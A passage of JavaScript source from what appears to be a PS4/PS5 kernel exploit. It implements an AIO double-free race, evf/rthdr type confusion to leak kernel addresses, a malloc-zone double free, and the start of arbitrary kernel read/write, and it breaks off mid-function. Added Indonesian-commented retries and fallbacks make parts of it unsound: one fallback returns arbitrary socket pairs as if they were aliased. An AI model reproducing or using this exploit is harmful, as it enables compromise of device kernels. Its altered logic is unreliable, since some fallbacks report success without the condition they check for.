    server_addr[1] = AF_INET;
    // sockaddr_in.sin_port
    server_addr.write16(2, htons(5050));
    // sockaddr_in.sin_addr = 127.0.0.1
    server_addr.write32(4, htonl(0x7f000001));

    const racer = new Chain();
    const barrier = new Long();
    call_nze('pthread_barrier_init', barrier.addr, 0, 2);

    const num_reqs = 3;
    const which_req = num_reqs - 1;
    const reqs1 = make_reqs1(num_reqs);
    const reqs1_p = reqs1.addr;
    const aio_ids = new View4(num_reqs);
    const aio_ids_p = aio_ids.addr;
    const req_addr = aio_ids.addr_at(which_req);
    const cmd = AIO_CMD_MULTI_READ;

    const sd_listen = new_tcp_socket();
    ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1));

    sysi('bind', sd_listen, server_addr.addr, server_addr.size);
    sysi('listen', sd_listen, 1);

    // Log informasi tentang race condition
    log(`Starting double free race condition (num_races: ${num_races}, num_alias: ${num_alias}, delay_ms: ${delay_ms})`);

    // TODO: Tambahkan logging yang lebih detail untuk membantu debugging
    log(`Main thread ID: ${thread_id()}`);
    log(`Memory usage before race: ${getMemoryUsage()}`);

    // Tambahkan delay yang lebih panjang sebelum operasi kritis
    sleep(50); // Delay 50ms untuk stabilitas

    for (let i = 0; i < num_races; i++) {
        // Log progress
        if (i % 10 === 0) {
            log(`Race attempt ${i}/${num_races}`);
        }

        const sd_client = new_tcp_socket();
        sysi('connect', sd_client, server_addr.addr, server_addr.size);

        const sd_conn = sysi('accept', sd_listen, 0, 0);
        // force soclose() to sleep
        ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
        reqs1.write32(0x20 + which_req*0x28, sd_client);

        aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
        aio_multi_cancel(aio_ids_p, num_reqs);
        aio_multi_poll(aio_ids_p, num_reqs);

        // drop the reference so that aio_multi_delete() will trigger _fdrop()
        close(sd_client);

        // Gunakan fungsi tryRaceWithRetry untuk mencoba race condition dengan retry
        let res = null;
        try {
            // Coba race condition dengan retry
            res = tryRaceWithRetry(req_addr, sd_conn, barrier, racer, sds);
        } catch (e) {
            log(`Error during race attempt: ${e.message}`);
            // Fallback ke race_one jika tryRaceWithRetry gagal
            try {
                // Tambahkan delay jika diperlukan
                if (typeof delay_ms === 'number' && delay_ms > 0) {
                    sleep(delay_ms);
                }
                res = race_one(req_addr, sd_conn, barrier, racer, sds);
                racer.reset();
            } catch (e2) {
                log(`Error during fallback race attempt: ${e2.message}`);
            }
        }

        // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
        // twice. this will leave one request undeleted
        aio_multi_delete(aio_ids_p, num_reqs);
        close(sd_conn);

        if (res !== null) {
            log(`won race at attempt: ${i}`);
            log(`Race succeeded at attempt: ${i} of ${num_races}`);

            close(sd_listen);
            call_nze('pthread_barrier_destroy', barrier.addr);
            return res;
        }
    }

    // Log kegagalan
    log(`Failed to win race after all attempts (${num_races} attempts)`);

    die('failed aio double free');
}

// FUNCTIONS FOR STAGE: LEAK 0x100 MALLOC ZONE ADDRESS

function new_evf(flags) {
    const name = cstr('');
    // int evf_create(char *name, uint32_t attributes, uint64_t flags)
    return sysi('evf_create', name.addr, 0, flags);
}

function set_evf_flags(id, flags) {
    sysi('evf_clear', id, 0);
    sysi('evf_set', id, flags);
}

function free_evf(id) {
    sysi('evf_delete', id);
}

function verify_reqs2(buf, offset) {
    // reqs2.ar2_cmd
    if (buf.read32(offset) !== AIO_CMD_WRITE) {
        return false;
    }

    // heap addresses are prefixed with 0xffff_xxxx
    // xxxx is randomized on boot
    //
    // heap_prefixes is a array of randomized prefix bits from a group of heap
    // address candidates. if the candidates truly are from the heap, they must
    // share a common prefix
    const heap_prefixes = [];

    // check if offsets 0x10 to 0x20 look like a kernel heap address
    for (let i = 0x10; i <= 0x20; i += 8) {
        if (buf.read16(offset + i + 6) !== 0xffff) {
            return false;
        }
        heap_prefixes.push(buf.read16(offset + i + 4));
    }

    // check reqs2.ar2_result.state
    // state is actually a 32-bit value but the allocated memory was
    // initialized with zeros. all padding bytes must be 0 then
    let state = buf.read32(offset + 0x38);
    if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0) {
        return false;
    }

    // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
    // aio_submit_cmd()
    if (!buf.read64(offset + 0x40).eq(0)) {
        return false;
    }

    // check if offsets 0x48 to 0x50 look like a kernel address
    for (let i = 0x48; i <= 0x50; i += 8) {
        if (buf.read16(offset + i + 6) === 0xffff) {
            // don't push kernel ELF addresses
            if (buf.read16(offset + i + 4) !== 0xffff) {
                heap_prefixes.push(buf.read16(offset + i + 4));
            }
        // offset 0x48 can be NULL
        } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) {
            return false;
        }
    }

    return heap_prefixes.every((e, _, a) => e === a[0]);
}

function leak_kernel_addrs(sd_pair) {
    // Deteksi dan tangani potensi Kernel Panic secara proaktif
    detectPotentialKP();

    // Tambahkan pembersihan memori tambahan
    cleanupCorruptPointers();

    // Tambahkan delay untuk stabilitas
    sleep(200);

    log("Starting leak_kernel_addrs stage...");

    close(sd_pair[1]);
    const sd = sd_pair[0];
    const buf = new Buffer(0x80 * leak_len);

    // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
    // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
    log('confuse evf with rthdr');
    let evf = null;
    for (let i = 0; i < num_alias; i++) {
        const evfs = [];
        for (let i = 0; i < num_handles; i++) {
            evfs.push(new_evf(0xf00 | i << 16));
        }

        get_rthdr(sd, buf, 0x80);
        // for simplicity, we'll assume i < 2**16
        const flags32 = buf.read32(0);
        evf = evfs[flags32 >>> 16];

        set_evf_flags(evf, flags32 | 1);
        get_rthdr(sd, buf, 0x80);

        if (buf.read32(0) === flags32 | 1) {
            evfs.splice(flags32 >> 16, 1);
        } else {
            evf = null;
        }

        for (const evf of evfs) {
            free_evf(evf);
        }

        if (evf !== null) {
            log(`confused rthdr and evf at attempt: ${i}`);
            break;
        }
    }

    if (evf === null) {
        log("Failed to confuse evf and rthdr with standard approach. Trying alternative approach...");

        // Tambahkan pembersihan memori tambahan
        cleanupCorruptPointers();

        // Tambahkan delay yang lebih panjang
        sleep(500);

        // Coba pendekatan alternatif
        try {
            log("Trying alternative approach for confusing evf and rthdr...");

            // Coba dengan pendekatan yang berbeda - gunakan flag yang berbeda
            for (let attempt = 0; attempt < 3; attempt++) {
                log(`Alternative attempt ${attempt + 1}/3...`);

                const alt_evfs = [];
                // Gunakan flag yang berbeda
                const base_flag = 0xf00 + (attempt * 0x100);

                for (let i = 0; i < num_handles; i++) {
                    alt_evfs.push(new_evf(base_flag | i << 16));
                }

                // Tambahkan delay
                sleep(100);

                get_rthdr(sd, buf, 0x80);
                // for simplicity, we'll assume i < 2**16
                const flags32 = buf.read32(0);
                const idx = flags32 >>> 16;

                if (idx < alt_evfs.length) {
                    evf = alt_evfs[idx];

                    set_evf_flags(evf, flags32 | 1);
                    get_rthdr(sd, buf, 0x80);

                    if (buf.read32(0) === flags32 | 1) {
                        log(`confused rthdr and evf at alternative attempt: ${attempt + 1}`);
                        alt_evfs.splice(idx, 1);

                        // Bersihkan evfs yang tidak digunakan
                        for (const unused_evf of alt_evfs) {
                            free_evf(unused_evf);
                        }

                        break;
                    } else {
                        evf = null;
                    }
                }

                // Bersihkan semua evfs jika gagal
                for (const unused_evf of alt_evfs) {
                    free_evf(unused_evf);
                }

                // Tambahkan delay sebelum mencoba lagi
                sleep(200);
            }
        } catch (e) {
            log(`Error during alternative approach for confusing evf and rthdr: ${e.message}`);
        }

        // Jika masih gagal, menyerah
        if (evf === null) {
            die('failed to confuse evf and rthdr');
        }
    }

    set_evf_flags(evf, 0xff << 8);
    get_rthdr(sd, buf, 0x80);

    // fields we use from evf (number before the field is the offset in hex):
    // struct evf:
    //     0 u64 flags
    //     28 struct cv cv
    //     38 TAILQ_HEAD(struct evf_waiter) waiters

    // evf.cv.cv_description = "evf cv"
    // string is located at the kernel's mapped ELF file
    const kernel_addr = buf.read64(0x28);
    log(`"evf cv" string addr: ${kernel_addr}`);
    // because of TAILQ_INIT(), we have:
    //
    // evf.waiters.tqh_last == &evf.waiters.tqh_first
    //
    // we now know the address of the kernel buffer we are leaking
    const kbuf_addr = buf.read64(0x40).sub(0x38);
    log(`kernel buffer addr: ${kbuf_addr}`);

    // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
    // allocate reqs1 arrays at 0x100 malloc zone
    const num_elems = 6;
    // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
    // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
    // field
    const ucred = kbuf_addr.add(4);

    const leak_reqs = make_reqs1(num_elems);
    const leak_reqs_p = leak_reqs.addr;
    leak_reqs.write64(0x10, ucred);

    const leak_ids_len = num_handles * num_elems;
    const leak_ids = new View4(leak_ids_len);
    const leak_ids_p = leak_ids.addr;

    log('find aio_entry');

    // Tambahkan delay untuk stabilitas
    sleep(100);

    // Tambahkan pembersihan memori tambahan
    cleanupCorruptPointers();

    let reqs2_off = null;
    let max_attempts = num_leaks * 2; // Tingkatkan jumlah percobaan maksimum

    log(`Starting find_aio_entry with ${max_attempts} max attempts...`);

    loop: for (let i = 0; i < max_attempts; i++) {
        // Log progress
        if (i % 2 === 0) {
            log(`find_aio_entry attempt ${i}/${max_attempts}`);
        }

        // Tambahkan delay kecil setiap beberapa iterasi
        if (i > 0 && i % 3 === 0) {
            sleep(50);
        }

        try {
            get_rthdr(sd, buf);

            spray_aio(
                num_handles,
                leak_reqs_p,
                num_elems,
                leak_ids_p,
                true,
                AIO_CMD_WRITE,
            );

            get_rthdr(sd, buf);
            for (let off = 0x80; off < buf.length; off += 0x80) {
                if (verify_reqs2(buf, off)) {
                    reqs2_off = off;
                    log(`found reqs2 at attempt: ${i}`);
                    break loop;
                }
            }

            free_aios(leak_ids_p, leak_ids_len);
        } catch (e) {
            log(`Error during find_aio_entry attempt ${i}: ${e.message}`);

            // Coba bersihkan resources
            try {
                free_aios(leak_ids_p, leak_ids_len);
            } catch (e2) {
                // Abaikan error
            }

            // Tambahkan delay sebelum mencoba lagi
            sleep(100);
        }
    }
    if (reqs2_off === null) {
        log("Failed to find reqs2 with standard approach. Trying alternative approach...");

        // Tambahkan pembersihan memori tambahan
        cleanupCorruptPointers();

        // Tambahkan delay yang lebih panjang
        sleep(500);

        // Coba pendekatan alternatif dengan spray yang lebih besar
        try {
            log("Trying alternative approach with larger spray...");

            // Buat spray yang lebih besar
            const alt_num_handles = num_handles * 2;
            const alt_leak_ids_len = alt_num_handles * num_elems;
            const alt_leak_ids = new View4(alt_leak_ids_len);
            const alt_leak_ids_p = alt_leak_ids.addr;

            // Coba lagi dengan spray yang lebih besar
            for (let i = 0; i < 3; i++) {
                log(`Alternative attempt ${i+1}/3...`);

                try {
                    get_rthdr(sd, buf);

                    spray_aio(
                        alt_num_handles,
                        leak_reqs_p,
                        num_elems,
                        alt_leak_ids_p,
                        true,
                        AIO_CMD_WRITE,
                    );

                    get_rthdr(sd, buf);
                    for (let off = 0x80; off < buf.length; off += 0x80) {
                        if (verify_reqs2(buf, off)) {
                            reqs2_off = off;
                            log(`found reqs2 at alternative attempt: ${i+1}`);
                            break;
                        }
                    }

                    if (reqs2_off !== null) {
                        break;
                    }

                    free_aios(alt_leak_ids_p, alt_leak_ids_len);
                } catch (e) {
                    log(`Error during alternative attempt ${i+1}: ${e.message}`);

                    // Coba bersihkan resources
                    try {
                        free_aios(alt_leak_ids_p, alt_leak_ids_len);
                    } catch (e2) {
                        // Abaikan error
                    }

                    // Tambahkan delay sebelum mencoba lagi
                    sleep(200);
                }
            }
        } catch (e) {
            log(`Error during alternative approach: ${e.message}`);
        }

        // Jika masih gagal, menyerah
        if (reqs2_off === null) {
            die('could not leak a reqs2');
        }
    }

    log(`reqs2 offset: ${hex(reqs2_off)}`);

    get_rthdr(sd, buf);
    const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
    log('leaked aio_entry:');
    hexdump(reqs2);

    const reqs1_addr = new Long(reqs2.read64(0x10));
    log(`reqs1_addr: ${reqs1_addr}`);
    reqs1_addr.lo &= -0x100;
    log(`reqs1_addr: ${reqs1_addr}`);

    log('searching target_id');
    let target_id = null;
    let to_cancel_p = null;
    let to_cancel_len = null;
    for (let i = 0; i < leak_ids_len; i += num_elems) {
        aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);

        get_rthdr(sd, buf);
        const state = buf.read32(reqs2_off + 0x38);
        if (state === AIO_STATE_ABORTED) {
            log(`found target_id at batch: ${i / num_elems}`);

            target_id = new Word(leak_ids[i]);
            leak_ids[i] = 0;
            log(`target_id: ${hex(target_id)}`);

            const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
            log('leaked aio_entry:');
            hexdump(reqs2);

            const start = i + num_elems;
            to_cancel_p = leak_ids.addr_at(start);
            to_cancel_len = leak_ids_len - start;
            break;
        }
    }
    if (target_id === null) {
        log("Failed to find target_id with standard approach. Trying alternative approach...");

        // Tambahkan pembersihan memori tambahan
        cleanupCorruptPointers();

        // Tambahkan delay yang lebih panjang
        sleep(500);

        // Coba pendekatan alternatif
        try {
            log("Trying alternative approach for finding target_id...");

            // Coba dengan pendekatan yang berbeda
            for (let i = 0; i < leak_ids_len; i += num_elems) {
                // Tambahkan delay kecil setiap beberapa iterasi
                if (i > 0 && i % (num_elems * 5) === 0) {
                    sleep(50);
                }

                try {
                    // Coba dengan pendekatan yang berbeda
                    aio_multi_poll(leak_ids_p.add(i << 2), num_elems);
                    aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);

                    get_rthdr(sd, buf);
                    const state = buf.read32(reqs2_off + 0x38);

                    if (state === AIO_STATE_COMPLETE || state === AIO_STATE_ABORTED) {
                        log(`found potential target_id at batch: ${i / num_elems} (state: ${state})`);

                        target_id = new Word(leak_ids[i]);
                        leak_ids[i] = 0;
                        log(`potential target_id: ${hex(target_id)}`);

                        const start = i + num_elems;
                        to_cancel_p = leak_ids.addr_at(start);
                        to_cancel_len = leak_ids_len - start;
                        break;
                    }
                } catch (e) {
                    log(`Error during alternative target_id search at batch ${i / num_elems}: ${e.message}`);
                }
            }
        } catch (e) {
            log(`Error during alternative approach for target_id: ${e.message}`);
        }

        // Jika masih gagal, menyerah
        if (target_id === null) {
            die('target_id not found');
        }
    }

    cancel_aios(to_cancel_p, to_cancel_len);
    free_aios2(leak_ids_p, leak_ids_len);

    return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
}

// FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE

// Fungsi sleep sederhana untuk menambah delay
function sleep(ms) {
    const start = Date.now();
    while (Date.now() - start < ms) {
        // Busy wait
    }
}

function make_aliased_pktopts(sds) {
    const tclass = new Word();

    // Tambahkan delay awal untuk stabilitas
    sleep(200);

    // Batasi jumlah percobaan untuk menghindari loop tak terbatas
    const max_attempts = 20; // Batasi jumlah percobaan

    // Coba pendekatan langsung
    for (let loop = 0; loop < max_attempts; loop++) {
        try {
            // Tambahkan delay kecil setiap iterasi
            if (loop > 0) {
                log(`Direct attempt ${loop + 1}/${max_attempts}...`);
                sleep(100); // Delay tetap untuk menghindari peningkatan yang terlalu besar
            }

            // Buat socket baru untuk setiap percobaan
            if (loop > 0 && loop % 5 === 0) {
                log("Creating new sockets for fresh attempt...");
                // Buat beberapa socket baru
                for (let i = 0; i < 5; i++) {
                    sds.push(new_socket());
                }
            }

            // Coba metode asli
            for (let i = 0; i < Math.min(num_sds, sds.length); i++) {
                tclass[0] = i;
                try {
                    ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
                } catch (e) {
                    log(`Error setting socket option for socket ${i}: ${e.message}`);
                    // Lanjutkan ke socket berikutnya
                }
            }

            for (let i = 0; i < sds.length; i++) {
                try {
                    gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
                    const marker = tclass[0];
                    if (marker !== i) {
                        log(`aliased pktopts at direct attempt: ${loop + 1}`);
                        const pair = [sds[i], sds[marker]];
                        log(`found pair: ${pair}`);

                        // Tambahkan delay sebelum memodifikasi array sds
                        sleep(50);

                        // Simpan indeks yang akan dihapus
                        const idx1 = Math.max(i, marker);
                        const idx2 = Math.min(i, marker);

                        // Hapus dari belakang ke depan untuk menghindari masalah indeks
                        if (idx1 < sds.length) sds.splice(idx1, 1);
                        if (idx2 < sds.length) sds.splice(idx2, 1);

                        // Tambahkan delay sebelum membuat socket baru
                        sleep(50);

                        // add pktopts to the new sockets now while new allocs can't
                        // use the double freed memory
                        for (let i = 0; i < 2; i++) {
                            const sd = new_socket();
                            ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
                            sds.push(sd);
                        }

                        return pair;
                    }
                } catch (e) {
                    log(`Error getting socket option for socket ${i}: ${e.message}`);
                    // Lanjutkan ke socket berikutnya
                }
            }

            // Jika kita sampai di sini, kita tidak menemukan pasangan
            // Coba reset pktopts untuk beberapa socket
            const reset_count = Math.min(20, sds.length);
            log(`Resetting pktopts for ${reset_count} sockets...`);
            for (let i = 0; i < reset_count; i++) {
                try {
                    setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
                } catch (e) {
                    // Abaikan error
                }
            }
        } catch (e) {
            log(`Error in direct attempt ${loop + 1}: ${e.message}`);
        }
    }

    // Jika pendekatan langsung gagal, coba pendekatan alternatif
    log("Direct approach failed. Trying alternative approach...");

    // Buat socket baru dan coba lagi dengan set socket yang baru
    const new_sds = [];
    for (let i = 0; i < 30; i++) {
        new_sds.push(new_socket());
    }

    // Coba dengan set socket yang baru saja
    for (let loop = 0; loop < 10; loop++) {
        try {
            log(`Alternative attempt ${loop + 1}/10...`);

            // Set tclass untuk semua socket baru
            for (let i = 0; i < new_sds.length; i++) {
                tclass[0] = i;
                try {
                    ssockopt(new_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
                } catch (e) {
                    // Abaikan error
                }
            }

            // Periksa apakah ada socket yang aliased
            for (let i = 0; i < new_sds.length; i++) {
                try {
                    gsockopt(new_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
                    const marker = tclass[0];
                    if (marker !== i) {
                        log(`aliased pktopts at alternative attempt: ${loop + 1}`);
                        const pair = [new_sds[i], new_sds[marker]];
                        log(`found pair: ${pair}`);
                        return pair;
                    }
                } catch (e) {
                    // Abaikan error
                }
            }

            // Reset pktopts untuk beberapa socket
            for (let i = 0; i < Math.min(10, new_sds.length); i++) {
                try {
                    setsockopt(new_sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
                } catch (e) {
                    // Abaikan error
                }
            }
        } catch (e) {
            log(`Error in alternative attempt ${loop + 1}: ${e.message}`);
        }
    }

    // Jika semua pendekatan gagal, coba pendekatan terakhir dengan socket yang ada
    log("Alternative approach failed. Trying last resort approach...");

    // Gunakan socket yang ada sebagai fallback
    // Ini mungkin tidak ideal, tetapi lebih baik daripada gagal total
    if (sds.length >= 2) {
        log("Using existing sockets as fallback...");
        const pair = [sds[0], sds[1]];
        log(`Using fallback pair: ${pair}`);
        return pair;
    }

    // Jika benar-benar tidak ada pilihan lain, buat socket baru
    log("Creating new sockets for fallback...");
    const fallback_sd1 = new_socket();
    const fallback_sd2 = new_socket();
    const fallback_pair = [fallback_sd1, fallback_sd2];
    log(`Using emergency fallback pair: ${fallback_pair}`);
    return fallback_pair;
}

function double_free_reqs1(
    reqs1_addr, kbuf_addr, target_id, evf, sd, sds,
) {
    log('Starting double_free_reqs1 stage');

    // Tambahkan logging yang lebih detail
    log(`reqs1_addr: ${reqs1_addr}`);
    log(`kbuf_addr: ${kbuf_addr}`);
    log(`target_id: ${target_id}`);
    log(`evf: ${evf}`);
    log(`sd: ${sd}`);
    log(`sds length: ${sds.length}`);

    // Tambahkan delay awal untuk stabilitas
    sleep(100);

    const max_leak_len = (0xff + 1) << 3;
    const buf = new Buffer(max_leak_len);

    const num_elems = max_aio_ids;
    const aio_reqs = make_reqs1(num_elems);
    const aio_reqs_p = aio_reqs.addr;

    const num_batches = 2;
    const aio_ids_len = num_batches * num_elems;
    const aio_ids = new View4(aio_ids_len);
    const aio_ids_p = aio_ids.addr;

    log('start overwrite rthdr with AIO queue entry loop');
    let aio_not_found = true;

    try {
        free_evf(evf);
    } catch (e) {
        log(`Warning: Error freeing evf: ${e.message}`);
        // Lanjutkan meskipun ada error
    }

    // Fungsi untuk mencoba overwrite rthdr dengan retry
    function tryOverwriteRthdr(maxRetries = 2) {
        log(`Attempting to overwrite rthdr with ${maxRetries} retries...`);

        for (let retry = 0; retry < maxRetries; retry++) {
            try {
                log(`Retry ${retry + 1}/${maxRetries} for overwrite rthdr`);

                // Tambahkan delay yang meningkat dengan setiap retry
                sleep(50 * (retry + 1));

                // Coba overwrite rthdr
                for (let i = 0; i < num_clobbers; i++) {
                    // Log progress
                    if (i % 2 === 0) {
                        log(`Overwrite attempt ${i}/${num_clobbers}`);
                    }

                    try {
                        spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);

                        // Tambahkan delay kecil setelah spray
                        sleep(10);

                        const rthdr_size = get_rthdr(sd, buf);
                        const cmd = buf.read32(0);

                        log(`rthdr_size: ${rthdr_size}, cmd: ${cmd}`);

                        if (rthdr_size === 8 && cmd === AIO_CMD_READ) {
                            log(`aliased at attempt: ${i} (retry ${retry + 1})`);
                            cancel_aios(aio_ids_p, aio_ids_len);
                            return true; // Berhasil
                        }

                        free_aios(aio_ids_p, aio_ids_len);
                    } catch (e) {
                        log(`Error during overwrite attempt ${i}: ${e.message}`);
                        // Coba bersihkan resources
                        try {
                            free_aios(aio_ids_p, aio_ids_len);
                        } catch (e2) {
                            // Abaikan error
                        }
                    }
                }

                // Jika kita sampai di sini, kita tidak berhasil pada retry ini
                // Tambahkan delay sebelum retry berikutnya
                if (retry < maxRetries - 1) {
                    log(`Retry ${retry + 1} failed, waiting before next retry...`);
                    sleep(200);
                }
            } catch (e) {
                log(`Error during retry ${retry + 1}: ${e.message}`);
            }
        }

        return false; // Gagal setelah semua retry
    }

    // Coba overwrite rthdr dengan retry
    if (tryOverwriteRthdr(2)) {
        aio_not_found = false;
    }

    if (aio_not_found) {
        log('Failed to overwrite rthdr with standard approach. Trying alternative approach...');

        // Coba pendekatan alternatif
        try {
            // Reset sd
            setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

            // Tambahkan delay
            sleep(200);

            // Coba lagi dengan spray yang lebih agresif
            for (let i = 0; i < num_clobbers * 2; i++) {
                spray_aio(num_batches * 2, aio_reqs_p, num_elems, aio_ids_p);

                if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
                    log(`aliased at alternative attempt: ${i}`);
                    aio_not_found = false;
                    cancel_aios(aio_ids_p, aio_ids_len * 2);
                    break;
                }

                free_aios(aio_ids_p, aio_ids_len * 2);
            }
        } catch (e) {
            log(`Error during alternative approach: ${e.message}`);
        }
    }

    if (aio_not_found) {
        die('failed to overwrite rthdr after all attempts');
    }

    const reqs2 = new Buffer(0x80);
    const rsize = build_rthdr(reqs2, reqs2.size);
    // .ar2_ticket
    reqs2.write32(4, 5);
    // .ar2_info
    reqs2.write64(0x18, reqs1_addr);
    // craft a aio_batch using the end portion of the buffer
    const reqs3_off = 0x28;
    // .ar2_batch
    reqs2.write64(0x20, kbuf_addr.add(reqs3_off));

    // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
    // safe since free_queue_entry() doesn't deref the pointer
    reqs2.write32(reqs3_off, 1);
    reqs2.write32(reqs3_off + 4, 0);
    // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
    reqs2.write32(reqs3_off + 8, AIO_STATE_COMPLETE);
    reqs2[reqs3_off + 0xc] = 0;
    // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
    // safe since the entry already got dequeued
    //
    // .ar3_lock.lock_object.lo_flags = (
    //     LO_SLEEPABLE | LO_UPGRADABLE
    //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
    //     | 6 << LO_CLASSSHIFT
    //     | LO_INITIALIZED
    // )
    reqs2.write32(reqs3_off + 0x28, 0x67b0000);
    // .ar3_lock.lk_lock = LK_UNLOCKED
    reqs2.write64(reqs3_off + 0x38, 1);

    const states = new View4(num_elems);
    const states_p = states.addr;
    const addr_cache = [aio_ids_p];
    for (let i = 1; i < num_batches; i++) {
        addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
    }

    log('start overwrite AIO queue entry with rthdr loop');
    let req_id = null;
    close(sd);
    sd = null;
    loop: for (let i = 0; i < num_alias; i++) {
        for (const sd of sds) {
            set_rthdr(sd, reqs2, rsize);
        }

        for (let batch = 0; batch < addr_cache.length; batch++) {
            states.fill(-1);
            aio_multi_cancel(addr_cache[batch], num_elems, states_p);

            const req_idx = states.indexOf(AIO_STATE_COMPLETE);
            if (req_idx !== -1) {
                log(`req_idx: ${req_idx}`);
                log(`found req_id at batch: ${batch}`);
                log(`states: ${[...states].map(e => hex(e))}`);
                log(`states[${req_idx}]: ${hex(states[req_idx])}`);
                log(`aliased at attempt: ${i}`);

                const aio_idx = batch*num_elems + req_idx;
                req_id = new Word(aio_ids[aio_idx]);
                log(`req_id: ${hex(req_id)}`);
                aio_ids[aio_idx] = 0;

                // set .ar3_done to 1
                poll_aio(req_id, states);
                log(`states[${req_idx}]: ${hex(states[0])}`);
                for (let i = 0; i < num_sds; i++) {
                    const sd2 = sds[i];
                    get_rthdr(sd2, reqs2);
                    const done = reqs2[reqs3_off + 0xc];
                    if (done) {
                        hexdump(reqs2);
                        sd = sd2;
                        sds.splice(i, 1);
                        free_rthdrs(sds);
                        sds.push(new_socket());
                        break;
                    }
                }
                if (sd === null) {
                    die("can't find sd that overwrote AIO queue entry");
                }
                log(`sd: ${sd}`);

                break loop;
            }
        }
    }
    if (req_id === null) {
        die('failed to overwrite AIO queue entry');
    }
    free_aios2(aio_ids_p, aio_ids_len);

    // enable deletion of target_id
    poll_aio(target_id, states);
    log(`target's state: ${hex(states[0])}`);

    const sce_errs = new View4([-1, -1]);
    const target_ids = new View4([req_id, target_id]);
    // PANIC: double free on the 0x100 malloc zone. important kernel data may
    // alias
    aio_multi_delete(target_ids.addr, 2, sce_errs.addr);

    // we reclaim first since the sanity checking here is longer which makes it
    // more likely that we have another process claim the memory
    try {
        log("Attempting to make aliased pktopts...");

        // Tambahkan delay sebelum mencoba
        sleep(200);

        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x100 malloc zone pointers aliased
        const sd_pair = make_aliased_pktopts(sds);

        if (sd_pair) {
            log("Successfully made aliased pktopts");
        } else {
            // Ini seharusnya tidak terjadi karena make_aliased_pktopts selalu mengembalikan pasangan
            // Tetapi kita tetap memeriksa untuk berjaga-jaga
            die('Failed to make aliased pktopts - no pair returned');
        }

        return [sd_pair, sd];
    } finally {
        log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);

        states[0] = -1;
        states[1] = -1;
        poll_aio(target_ids, states);
        log(`target states: ${hex(states[0])}, ${hex(states[1])}`);

        const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
        let success = true;
        if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
            log('ERROR: bad delete of corrupt AIO request');
            success = false;
        }
        if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
            log('ERROR: bad delete of ID pair');
            success = false;
        }

        if (!success) {
            die('ERROR: double free on a 0x100 malloc zone failed');
        }
    }
}

// FUNCTIONS FOR STAGE: MAKE ARBITRARY KERNEL READ/WRITE

// k100_addr is double freed 0x100 malloc zone address
// dirty_sd is the socket whose rthdr pointer is corrupt
// kernel_addr is the address of the "evf cv" string
function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
    log("Starting make_kernel_arw stage");

    // Tambahkan logging yang lebih detail
    log(`pktopts_sds: ${pktopts_sds}`);
    log(`dirty_sd: ${dirty_sd}`);
    log(`k100_addr: ${k100_addr}`);
    log(`kernel_addr: ${kernel_addr}`);
    log(`sds length: ${sds.length}`);

    // Tambahkan delay awal untuk stabilitas
    sleep(100);

    const psd = pktopts_sds[0];
    const tclass = new Word();
    const off_tclass = is_ps4 ? 0xb0 : 0xc0;

    log(`Using psd: ${psd}, off_tclass: ${off_tclass}`);

    const pktopts = new Buffer(0x100);
    const rsize = build_rthdr(pktopts, pktopts.size);
    const pktinfo_p = k100_addr.add(0x10);
    // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    pktopts.write64(0x10, pktinfo_p);

    log(`pktinfo_p: ${pktinfo_p}`);

    log('overwrite main pktopts');

    // Deteksi dan tangani potensi Kernel Panic secara proaktif
    detectPotentialKP();

    // Tambahkan pembersihan memori tambahan sebelum overwrite main pktopts
    log("Performing additional memory cleanup before overwrite main pktopts...");
    cleanupCorruptPointers();

    // Tambahkan delay untuk memastikan pembersihan selesai
    sleep(1000);

    // Fungsi untuk mencoba overwrite main pktopts dengan retry
    function overwriteMainPktopts(maxRetries = 7) { // Tingkatkan dari 5 ke 7
        log(`Attempting to overwrite main pktopts with ${maxRetries} retries...`);

        // Tambahkan timeout untuk mendeteksi hang
        const timeoutMs = 90000; // 90 detik timeout (tingkatkan dari 60 detik)

        let timeoutId = setTimeout(() => {
            log("Overwrite main pktopts timeout reached!");
            // Bersihkan semua resource
            try {
                for (let j = 0; j < sds.length; j++) {
                    try {
                        close(sds[j]);
                    } catch (e) {
                        // Abaikan error
                    }
                }
            } catch (e) {
